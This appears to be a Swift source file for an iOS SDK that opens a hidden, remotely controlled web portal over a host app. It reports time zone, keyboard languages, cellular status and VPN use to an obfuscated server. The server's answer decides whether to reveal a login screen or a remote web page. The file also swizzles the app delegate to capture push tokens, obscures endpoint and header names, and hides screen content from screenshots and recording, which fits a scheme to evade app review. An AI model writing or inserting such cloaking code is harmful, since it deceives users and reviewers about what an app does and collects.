
import Foundation
import UIKit
import UserNotifications
import Network
import CoreTelephony
import SystemConfiguration
import CommonCrypto
import Security

private let zcRuntimeConfig = Bundle.main.object(forInfoDictionaryKey: ZCRuntimeProfile.hostConfigKey) as? [String: Any] ?? [:]

let zcClientCode: String = zcRuntimeConfig[ZCRuntimeProfile.clientCodeConfigKey] as? String ?? ""
let zcCipherSeed: String = zcRuntimeConfig[ZCRuntimeProfile.cipherSeedConfigKey] as? String ?? ""
let zcCipherVector: String = zcRuntimeConfig[ZCRuntimeProfile.cipherVectorConfigKey] as? String ?? ""
let zcLaunchAssetName: String = zcRuntimeConfig[ZCRuntimeProfile.launchAssetConfigKey] as? String ?? ""
let zcSigninAssetName: String = zcRuntimeConfig[ZCRuntimeProfile.signinAssetConfigKey] as? String ?? ""
let zcGatewayMarker: String = zcRuntimeConfig[ZCRuntimeProfile.gatewayMarkerConfigKey] as? String ?? ""
let zcTraceEnabled: Bool = zcRuntimeConfig[ZCRuntimeProfile.traceEnabledConfigKey] as? Bool ?? false

var zcSigninRequestActive: Bool = false

public enum ZCLaunchKit {
    @discardableResult
    public static func boot(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        if Thread.isMainThread {
            ZCEntryDirector.shared.zcStartFlow()
        } else {
            DispatchQueue.main.async {
                ZCEntryDirector.shared.zcStartFlow()
            }
        }

        return true
    }
}

enum ZCPersistenceKey {
    static let loginToken = ZCRuntimeProfile.tokenStoreKey
    static let accountPassword = ZCRuntimeProfile.secretStoreKey
    static let deviceIdentity = ZCRuntimeProfile.deviceStoreKey
    static let remoteToken = ZCRuntimeProfile.pushStoreKey
    static let defaultDeviceIdentity = ZCRuntimeProfile.defaultDeviceIdentity
}

final class ZCEntryDirector {
    static let shared = ZCEntryDirector()
    var zcOverlayWindow: UIWindow?
    var zcDidPatchRemoteToken = false
    var zcDidAskRemoteNotice = false
    private var zcPathWatcher: NWPathMonitor?
    private let zcPathQueue = DispatchQueue(label: "launch.gate.reachability")
    private var zcDidCatchReachability = false
    private var zcDidStartFlow = false
    var zcEntryURLText: String = ""

    private enum ZCEntryRoute {
        case openWeb
        case showLogin(Bool?)
        case close
    }

    private struct ZCStartupDecision {
        let loginFlag: Int
        let locationFlag: Int?
        let openValue: String

        init?(_ payload: [String: Any]) {
            guard let loginFlag = payload["loginFlag"] as? Int else { return nil }
            self.loginFlag = loginFlag
            self.locationFlag = payload["locationFlag"] as? Int
            self.openValue = payload["openValue"] as? String ?? ""
        }
    }

    func zcStartFlow(in windowScene: UIWindowScene? = nil) {
        guard zcDidStartFlow == false else { return }
        zcDidStartFlow = true
        zcInstallRemoteTokenHook()
        zcInstallLaunchWindow(in: windowScene)
        zcBeginGateProbe()
    }

    private func zcInstallLaunchWindow(in preferredScene: UIWindowScene?) {
        let activeScene = preferredScene ?? UIApplication.shared.connectedScenes
            .compactMap { $0 as? UIWindowScene }
            .first

        if let activeScene {
            zcOverlayWindow = UIWindow(windowScene: activeScene)
        } else {
            zcOverlayWindow = UIWindow(frame: UIScreen.main.bounds)
        }

        zcOverlayWindow?.windowLevel = .normal + 1
        zcOverlayWindow?.rootViewController = ZCLaunchBackdropController()
        zcOverlayWindow?.makeKeyAndVisible()

        ZCPurchaseLedger.shared.zcBindStoreQueue()
    }

    private func zcBeginGateProbe() {
        DispatchQueue.main.async {
            ZCLoadingCurtain.zcSpin()
        }

        zcWaitForUsablePath()
    }

    private func zcWaitForUsablePath() {
        guard zcDidCatchReachability == false else { return }
        zcPathWatcher?.cancel()

        let monitor = NWPathMonitor()
        zcPathWatcher = monitor
        monitor.pathUpdateHandler = { [weak self] path in
            guard let self else { return }
            guard path.status == .satisfied else { return }
            guard self.zcDidCatchReachability == false else { return }

            self.zcDidCatchReachability = true
            self.zcPathWatcher?.cancel()
            self.zcPathWatcher = nil

            DispatchQueue.main.async {
                ZCLoadingCurtain.zcSpin()
                self.zcRequestStartupGate { state in
                    if state == false {
                        self.zcOverlayWindow?.isHidden = true
                        self.zcOverlayWindow = nil
                    }
                }
            }
        }
        monitor.start(queue: zcPathQueue)
    }

    func zcRequestRemoteNoticeIfNeeded() {
        zcInstallRemoteTokenHook()
        guard zcDidAskRemoteNotice == false else { return }
        zcDidAskRemoteNotice = true

        DispatchQueue.main.async {
            UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, _ in
                guard granted == true else { return }

                DispatchQueue.main.async {
                    UIApplication.shared.registerForRemoteNotifications()
                }
            }
        }
    }

    private func zcInstallRemoteTokenHook() {
        guard zcDidPatchRemoteToken == false else { return }
        guard let appDelegate = UIApplication.shared.delegate else { return }

        let delegateClass: AnyClass = type(of: appDelegate)
        let originalSelector = #selector(
            UIApplicationDelegate.application(_:didRegisterForRemoteNotificationsWithDeviceToken:)
        )
        let forwardingSelector = #selector(
            NSObject.zcCaptureTokenAndRelay(_:didRegisterForRemoteNotificationsWithDeviceToken:)
        )
        let saveOnlySelector = #selector(
            NSObject.zcCaptureTokenOnly(_:didRegisterForRemoteNotificationsWithDeviceToken:)
        )

        guard let forwardingMethod = class_getInstanceMethod(NSObject.self, forwardingSelector),
              let saveOnlyMethod = class_getInstanceMethod(NSObject.self, saveOnlySelector) else {
            return
        }

        if let originalMethod = class_getInstanceMethod(delegateClass, originalSelector) {
            method_exchangeImplementations(originalMethod, forwardingMethod)
            zcDidPatchRemoteToken = true
            return
        }

        zcDidPatchRemoteToken = class_addMethod(
            delegateClass,
            originalSelector,
            method_getImplementation(saveOnlyMethod),
            method_getTypeEncoding(saveOnlyMethod)
        )
    }

    fileprivate func zcSaveRemoteDeviceToken(_ deviceToken: Data) {
        let token = deviceToken.map { String(format: "%02.2hhx", $0) }.joined()
        UserDefaults.standard.set(token, forKey: ZCPersistenceKey.remoteToken)
    }

    private func zcRequestStartupGate(completion: @escaping ((Bool?) -> Void)) {
        guard Thread.isMainThread else {
            DispatchQueue.main.async {
                self.zcRequestStartupGate(completion: completion)
            }
            return
        }

        ZCLoadingCurtain.zcSpin()
        ZCSealedPostClient.zcSendSealedPost(path: "opi/v1/savre/ketndo", parameters: zcStartupProbeEnvelope()) { result, _ in
            DispatchQueue.main.async {
                switch result {
                case .success(let responsePayload):
                    self.zcApplyStartupPayload(responsePayload, completion: completion)
                case .failure:
                    completion(false)
                }
            }
        }
    }

    private func zcStartupProbeEnvelope() -> [String: Any] {
        [
            "qevto": TimeZone.current.identifier,
            "qevko": UITextInputMode.activeInputModes.compactMap { $0.primaryLanguage },
            "qevgo": zcTraceEnabled ? 1 : 0,
            "qevdo": zcHasCellularRadio() ? 1 : 0,
            "qevon": zcIsTunnelActive() ? 1 : 0
        ]
    }

    private func zcApplyStartupPayload(_ payload: [String: Any], completion: @escaping ((Bool?) -> Void)) {
        zcRequestRemoteNoticeIfNeeded()

        guard let entry = ZCStartupDecision(payload) else {
            completion(false)
            return
        }

        zcEntryURLText = entry.openValue
        zcPerformRoute(zcRouteForStartup(for: entry), completion: completion)
    }

    private func zcRouteForStartup(for payload: ZCStartupDecision) -> ZCEntryRoute {
        switch payload.loginFlag {
        case 0:
            return payload.locationFlag == 0 ? .showLogin(nil) : .close
        case 1:
            let hasLoginToken = zcReadLocalText(key: ZCPersistenceKey.loginToken)?.isEmpty == false
            return hasLoginToken ? .openWeb : .showLogin(true)
        default:
            return .close
        }
    }

    private func zcPerformRoute(_ action: ZCEntryRoute, completion: @escaping ((Bool?) -> Void)) {
        switch action {
        case .openWeb:
            completion(zcOpenWebPortal())
        case .showLogin(let result):
            ZCLoadingCurtain.zcFadeSpin()
            zcShowSigninScene()
            if let result {
                completion(result)
            }
        case .close:
            ZCLoadingCurtain.zcFadeSpin()
            completion(false)
        }
    }

    func zcSubmitSigninRequest() {
        ZCLoadingCurtain.zcSpin()
        let loginParameters: [String: Any] = [
            "qevdo": zcReadLocalText(key: ZCPersistenceKey.loginToken) ?? "",
            "qevon": zcCurrentDeviceMarker()
        ]

        ZCSealedPostClient.zcSendSealedPost(path: "opi/v1/merqa/nolvil", parameters: loginParameters) { result, _ in
            switch result {
            case .success(let responsePayload):
                if let loginToken = responsePayload["token"] as? String {
                    zcStoreLocalText(loginToken, key: ZCPersistenceKey.loginToken)
                }
                if let password = responsePayload["password"] as? String {
                    zcStoreLocalText(password, key: ZCPersistenceKey.accountPassword)
                }
                if zcTraceEnabled {
                    print("==========\(responsePayload)")
                }
                if self.zcEntryURLText.isEmpty {
                    self.zcRequestStartupGate { _ in
                        zcSigninRequestActive = false
                    }
                    return
                }
                self.zcOpenWebPortal()
                zcSigninRequestActive = false
            case .failure:
                zcSigninRequestActive = false
            }
        }
    }

    @discardableResult
    func zcOpenWebPortal() -> Bool {
        func zcAbortOpen() -> Bool {
            ZCLoadingCurtain.zcFadeSpin()
            zcSigninRequestActive = false
            return false
        }

        guard let loginToken = zcReadLocalText(key: ZCPersistenceKey.loginToken),
              !loginToken.isEmpty else {
            return zcAbortOpen()
        }
        guard !zcEntryURLText.isEmpty else {
            return zcAbortOpen()
        }
        guard !zcClientCode.isEmpty,
              zcCipherSeed.count == 16,
              zcCipherVector.count == 16 else {
            return zcAbortOpen()
        }

        let encrypted = ["token": loginToken, "timestamp": String(Int(Date().timeIntervalSince1970) * 1000)]
        guard let payload = zcEncodePlainJSON(encrypted),
              let encryptedData = ZCHexCipherBox.zcSealBody(plainText: payload),
              let encryptedString = String(data: encryptedData, encoding: .utf8),
              !encryptedString.isEmpty else {
            return zcAbortOpen()
        }

        DispatchQueue.main.async {
            ZCLoadingCurtain.zcSpin()
            let webController = ZCCanvasStage()
            webController.zcEntryURLText = "\(self.zcEntryURLText)/?openParams=\(encryptedString)&appId=\(zcClientCode)"
            webController.hidesBottomBarWhenPushed = true
            self.zcOverlayWindow?.rootViewController = UINavigationController(rootViewController: webController)
        }
        return true
    }

    private func zcShowSigninScene() {
        let loginController = ZCSigninBackdropController()
        loginController.hidesBottomBarWhenPushed = true
        zcOverlayWindow?.rootViewController = UINavigationController(rootViewController: loginController)
    }
}

class ZCLaunchBackdropController: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black

        let launchImageView = UIImageView()
        launchImageView.contentMode = .scaleToFill
        launchImageView.image = UIImage(named: zcLaunchAssetName)
        launchImageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(launchImageView)

        NSLayoutConstraint.activate([
            launchImageView.topAnchor.constraint(equalTo: view.topAnchor),
            launchImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            launchImageView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            launchImageView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
        ])
    }
}

class ZCSigninBackdropController: UIViewController {
    private let loginImageView = UIImageView()
    private let loginButton = UIButton(type: .system)

    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        zcBuildSigninScene()
    }

    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        zcSigninRequestActive = false
        ZCLoadingCurtain.zcClearSpin()
    }

    private func zcBuildSigninScene() {
        loginImageView.image = UIImage(named: zcSigninAssetName)
        loginImageView.contentMode = .scaleAspectFill
        loginImageView.clipsToBounds = true
        loginImageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(loginImageView)

        loginButton.setTitle("Log In", for: .normal)
        loginButton.setTitleColor(.white, for: .normal)
        loginButton.titleLabel?.font = .boldSystemFont(ofSize: 20)
        loginButton.backgroundColor = UIColor(red: 150 / 255, green: 52 / 255, blue: 253 / 255, alpha: 1)
        loginButton.layer.cornerRadius = 29
        loginButton.clipsToBounds = true
        loginButton.translatesAutoresizingMaskIntoConstraints = false
        loginButton.addTarget(self, action: #selector(zcSigninButtonTapped), for: .touchUpInside)
        view.addSubview(loginButton)

        NSLayoutConstraint.activate([
            loginImageView.topAnchor.constraint(equalTo: view.topAnchor),
            loginImageView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            loginImageView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            loginImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            loginButton.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 32),
            loginButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -32),
            loginButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -56),
            loginButton.heightAnchor.constraint(equalToConstant: 58)
        ])
    }

    @objc func zcSigninButtonTapped() {
        guard zcSigninRequestActive == false else { return }
        zcSigninRequestActive = true
        ZCEntryDirector.shared.zcSubmitSigninRequest()
    }
}

extension NSObject {
    @objc func zcCaptureTokenAndRelay(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        ZCEntryDirector.shared.zcSaveRemoteDeviceToken(deviceToken)
        zcCaptureTokenAndRelay(application, didRegisterForRemoteNotificationsWithDeviceToken: deviceToken)
    }

    @objc func zcCaptureTokenOnly(
        _ application: UIApplication,
        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
    ) {
        ZCEntryDirector.shared.zcSaveRemoteDeviceToken(deviceToken)
    }
}

func zcCurrentDeviceMarker() -> String {
    if let deviceId = zcReadLocalText(key: ZCPersistenceKey.deviceIdentity),
       !deviceId.isEmpty {
        return deviceId
    }
    let deviceId = UIDevice.current.identifierForVendor?.uuidString ?? ZCPersistenceKey.defaultDeviceIdentity
    zcStoreLocalText(deviceId, key: ZCPersistenceKey.deviceIdentity)
    return deviceId
}

func zcHasCellularRadio() -> Bool {
    let info = CTTelephonyNetworkInfo()

    if #available(iOS 12.0, *) {
        return info.serviceCurrentRadioAccessTechnology?.values.isEmpty == false
    } else {
        return info.currentRadioAccessTechnology != nil
    }
}

func zcIsTunnelActive() -> Bool {
    guard let settings = CFNetworkCopySystemProxySettings()?.takeRetainedValue() as? [String: Any],
          let scoped = settings["__SCOPED__"] as? [String: Any] else {
        return false
    }

    let vpnKeys = ["tap", "tun", "ppp", "ipsec", "utun"]

    return scoped.keys.contains { key in
        let lowerKey = key.lowercased()
        return vpnKeys.contains { lowerKey.contains($0) }
    }
}

func zcStoreLocalText(_ token: String, key: String) {
    if key == ZCPersistenceKey.loginToken {
        UserDefaults.standard.set(token, forKey: key)
        return
    }

    guard let tokenData = token.data(using: .utf8) else { return }

    let identity: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]
    var payload = identity
    payload[kSecValueData as String] = tokenData

    SecItemDelete(identity as CFDictionary)
    SecItemAdd(payload as CFDictionary, nil)
}

func zcReadLocalText(key: String) -> String? {
    if key == ZCPersistenceKey.loginToken {
        return UserDefaults.standard.string(forKey: key)
    }

    let query = zcKeychainValueQuery(key)
    var result: AnyObject?
    SecItemCopyMatching(query as CFDictionary, &result)

    guard let tokenData = result as? Data else { return nil }
    return String(data: tokenData, encoding: .utf8)
}

func zcRemoveLocalText(_ key: String) {
    if key == ZCPersistenceKey.loginToken {
        UserDefaults.standard.removeObject(forKey: key)
        return
    }

    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key
    ]

    SecItemDelete(query as CFDictionary)
}

private func zcKeychainValueQuery(_ key: String) -> [String: Any] {
    [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: key,
        kSecReturnData as String: true,
        kSecMatchLimit as String: kSecMatchLimitOne
    ]
}

final class ZCSecureSurfaceView: UIView {
    let protectedContentView = UIView()
    private let proxySecureField = ZCSecureProxyField()

    override init(frame: CGRect) {
        super.init(frame: frame)
        zcInstallShield()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        zcInstallShield()
    }

    private func zcInstallShield() {
        backgroundColor = .clear

        proxySecureField.isSecureTextEntry = true
        proxySecureField.backgroundColor = .clear
        proxySecureField.textColor = .clear
        proxySecureField.tintColor = .clear
        proxySecureField.borderStyle = .none
        proxySecureField.clipsToBounds = true

        addSubview(proxySecureField)
        zcPinEdges(proxySecureField, to: self)

        guard let secureCanvas = zcFindSecureCanvas(in: proxySecureField) else {
            assertionFailure("Secure canvas not found. Falling back to normal content view.")
            addSubview(protectedContentView)
            zcPinEdges(protectedContentView, to: self)
            return
        }

        secureCanvas.backgroundColor = .clear
        secureCanvas.isUserInteractionEnabled = true
        secureCanvas.clipsToBounds = true
        secureCanvas.tintColor = .systemBlue
        secureCanvas.addSubview(protectedContentView)
        zcPinEdges(protectedContentView, to: secureCanvas)
    }

    private func zcFindSecureCanvas(in view: UIView) -> UIView? {
        for subview in view.subviews {
            let name = NSStringFromClass(type(of: subview))

            if name.contains("CanvasView") ||
                name.contains("LayoutCanvasView") ||
                name.contains("TextLayoutCanvasView") {
                return subview
            }

            if let found = zcFindSecureCanvas(in: subview) {
                return found
            }
        }

        return nil
    }

    private func zcPinEdges(_ child: UIView, to parent: UIView) {
        child.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            child.leadingAnchor.constraint(equalTo: parent.leadingAnchor),
            child.trailingAnchor.constraint(equalTo: parent.trailingAnchor),
            child.topAnchor.constraint(equalTo: parent.topAnchor),
            child.bottomAnchor.constraint(equalTo: parent.bottomAnchor)
        ])
    }
}

private final class ZCSecureProxyField: UITextField {
    override var canBecomeFirstResponder: Bool {
        false
    }

    override func caretRect(for position: UITextPosition) -> CGRect {
        .zero
    }

    override func selectionRects(for range: UITextRange) -> [UITextSelectionRect] {
        []
    }
}

let zcVendorSeed = UIDevice.current.identifierForVendor?.uuidString

enum ZCPostBridgeError: Error {
    case brokenPayload
}

func zcGatewayRootText() -> String {
    let protocolText = "https://"
    let hostLead = "opi."
    let domainTail = ".link"
    return protocolText + hostLead + zcGatewayMarker + domainTail
}

class ZCSealedPostClient {
    static func zcSendSealedPost(
        path: String,
        parameters: [String: Any],
        allowsPlainResponse: Bool = false,
        completion: @escaping (Result<[String: Any], Error>, Bool?) -> Void
    ) {
        guard let url = URL(string: "\(zcGatewayRootText())/\(path)") else {
            completion(.failure(ZCPostBridgeError.brokenPayload), false)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        zcAttachCommonHeaders(to: &request)

        if let body = zcEncryptedBody(from: parameters) {
            request.httpBody = body
        } else if !parameters.isEmpty {
            completion(.failure(ZCPostBridgeError.brokenPayload), false)
            return
        }

        if zcTraceEnabled == true {
            print("Request headers: \(request.allHTTPHeaderFields ?? [:])")
            print(parameters as Any)
            print("\(zcGatewayRootText())/\(path)")
        }

        URLSession.shared.dataTask(with: request) { data, _, error in
            zcFinishRequest(data: data, error: error, allowsPlainResponse: allowsPlainResponse, completion: completion)
        }.resume()
    }

    private static func zcAttachCommonHeaders(to request: inout URLRequest) {
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        request.setValue(zcDeviceHeaderValue(), forHTTPHeaderField: "deviceNo")
        request.setValue("tavrel", forHTTPHeaderField: "qimdra")
        request.setValue("norkiv", forHTTPHeaderField: "peslom")
        request.setValue("velqor", forHTTPHeaderField: "hanmti")
        request.setValue(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "", forHTTPHeaderField: "appVersion")
        request.setValue(zcClientCode, forHTTPHeaderField: "appId")
        request.setValue(zcReadLocalText(key: ZCPersistenceKey.loginToken), forHTTPHeaderField: "loginToken")

        if let pushToken = UserDefaults.standard.string(forKey: ZCPersistenceKey.remoteToken),
           !pushToken.isEmpty {
            request.setValue(pushToken, forHTTPHeaderField: "pushToken")
        }
    }

    private static func zcDeviceHeaderValue() -> String {
        if let deviceNo = zcReadLocalText(key: ZCPersistenceKey.deviceIdentity),
           !deviceNo.isEmpty {
            return deviceNo
        }

        let deviceNo = zcVendorSeed ?? ZCPersistenceKey.defaultDeviceIdentity
        zcStoreLocalText(deviceNo, key: ZCPersistenceKey.deviceIdentity)
        return deviceNo
    }

    private static func zcEncryptedBody(from parameters: [String: Any]) -> Data? {
        guard !parameters.isEmpty else { return nil }
        guard let payload = zcEncodePlainJSON(parameters) else { return nil }
        return ZCHexCipherBox.zcSealBody(plainText: payload)
    }

    private static func zcFinishRequest(
        data: Data?,
        error: Error?,
        allowsPlainResponse: Bool,
        completion: @escaping (Result<[String: Any], Error>, Bool?) -> Void
    ) {
        if let error {
            completion(.failure(error), false)
            return
        }

        guard let data,
              let text = String(data: data, encoding: .utf8),
              let response = zcDecodePlainJSON(text) else {
            completion(.failure(ZCPostBridgeError.brokenPayload), false)
            return
        }

        if zcTraceEnabled {
            zcPrintJSONPayload(text)
        }

        guard let resultText = response["result"] as? String else {
            if allowsPlainResponse {
                completion(.success(response), nil)
            } else {
                completion(.failure(ZCPostBridgeError.brokenPayload), false)
            }
            return
        }

        guard let decrypted = ZCHexCipherBox.zcOpenPayload(cipherText: resultText) else {
            completion(.failure(ZCPostBridgeError.brokenPayload), false)
            return
        }

        if zcTraceEnabled {
            zcPrintObjectPayload(decrypted, label: "Decrypted")
        }
        completion(.success(decrypted), nil)
    }
}

class ZCHexCipherBox {
    static func zcSealBody(plainText: String) -> Data? {
        guard zcCipherSeed.count == 16, zcCipherVector.count == 16 else { return nil }
        guard let keyData = zcCipherSeed.data(using: .utf8),
              let ivData = zcCipherVector.data(using: .utf8),
              let inputData = plainText.data(using: .utf8) else { return nil }

        let bufferSize = inputData.count + kCCBlockSizeAES128
        var outputBuffer = Data(count: bufferSize)
        var processedByteCount: size_t = 0

        let cryptStatus = outputBuffer.withUnsafeMutableBytes { outputBytes in
            inputData.withUnsafeBytes { inputBytes in
                keyData.withUnsafeBytes { keyBytes in
                    ivData.withUnsafeBytes { ivBytes in
                        CCCrypt(
                            CCOperation(kCCEncrypt),
                            CCAlgorithm(kCCAlgorithmAES),
                            CCOptions(kCCOptionPKCS7Padding),
                            keyBytes.baseAddress, kCCKeySizeAES128,
                            ivBytes.baseAddress,
                            inputBytes.baseAddress, inputData.count,
                            outputBytes.baseAddress, bufferSize,
                            &processedByteCount
                        )
                    }
                }
            }
        }

        if cryptStatus == kCCSuccess {
            let outputData = outputBuffer.prefix(processedByteCount)
            let hexText = outputData.map { String(format: "%02x", $0) }.joined()
            return Data(hexText.utf8)
        } else {
            return nil
        }
    }

    static func zcOpenPayload(cipherText: String) -> [String: Any]? {
        guard zcCipherSeed.count == 16, zcCipherVector.count == 16 else { return nil }
        guard let keyData = zcCipherSeed.data(using: .utf8),
              let ivData = zcCipherVector.data(using: .utf8) else { return nil }

        var inputData = Data()
        var hexPair = ""
        for char in cipherText {
            hexPair.append(char)
            if hexPair.count == 2 {
                if let byte = UInt8(hexPair, radix: 16) {
                    inputData.append(byte)
                } else {
                    return nil
                }
                hexPair = ""
            }
        }
        if !hexPair.isEmpty { return nil }

        let bufferSize = inputData.count + kCCBlockSizeAES128
        var outputBuffer = Data(count: bufferSize)
        var processedByteCount: size_t = 0

        let cryptStatus = outputBuffer.withUnsafeMutableBytes { bufferBytes in
            inputData.withUnsafeBytes { dataBytes in
                keyData.withUnsafeBytes { keyBytes in
                    ivData.withUnsafeBytes { ivBytes in
                        CCCrypt(
                            CCOperation(kCCDecrypt),
                            CCAlgorithm(kCCAlgorithmAES),
                            CCOptions(kCCOptionPKCS7Padding),
                            keyBytes.baseAddress, kCCKeySizeAES128,
                            ivBytes.baseAddress,
                            dataBytes.baseAddress, inputData.count,
                            bufferBytes.baseAddress, bufferSize,
                            &processedByteCount
                        )
                    }
                }
            }
        }

        if cryptStatus == kCCSuccess {
            let outputData = outputBuffer.prefix(processedByteCount)
            if let decryptedPayload = try? JSONSerialization.jsonObject(with: outputData, options: []) as? [String: Any] {
                return decryptedPayload
            }
        }
        return nil
    }
}

func zcDecodePlainJSON(_ encrypted: String) -> [String: Any]? {
    guard let data = encrypted.data(using: .utf8),
          let dict = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
        return nil
    }
    return dict
}

func zcEncodePlainJSON(_ dict: [String: Any]) -> String? {
    guard let jsonData = try? JSONSerialization.data(withJSONObject: dict),
          let zcEncodePlainJSON = String(data: jsonData, encoding: .utf8) else {
        return nil
    }

    return zcEncodePlainJSON
}

func zcPrintJSONPayload(_ zcEncodePlainJSON: String) {
    guard let data = zcEncodePlainJSON.data(using: .utf8),
          let object = try? JSONSerialization.jsonObject(with: data),
          let prettyData = try? JSONSerialization.data(withJSONObject: object, options: [.prettyPrinted]),
          let prettyString = String(data: prettyData, encoding: .utf8) else {
        print(zcEncodePlainJSON)
        return
    }
    if zcTraceEnabled {
        print("Output: \(prettyString)")
    }
}

func zcPrintObjectPayload(_ object: Any, label: String) {
    guard JSONSerialization.isValidJSONObject(object),
          let data = try? JSONSerialization.data(withJSONObject: object, options: [.prettyPrinted]),
          let prettyString = String(data: data, encoding: .utf8) else {
        print("\(label): \(object)")
        return
    }
    print("\(label): \(prettyString)")
}
